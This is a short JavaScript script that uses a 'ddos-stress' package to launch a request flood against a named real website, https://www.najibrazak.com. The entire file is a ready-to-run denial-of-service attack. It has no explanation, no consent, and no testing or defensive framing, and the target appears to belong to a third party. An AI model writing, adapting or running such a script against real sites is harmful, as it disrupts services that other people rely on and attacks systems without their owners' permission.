var Stress = require("ddos-stress");

// Create new instance of DDoS Stress
var stress = new Stress();

// Run stress on server
stress.run("https://www.najibrazak.com", 200);
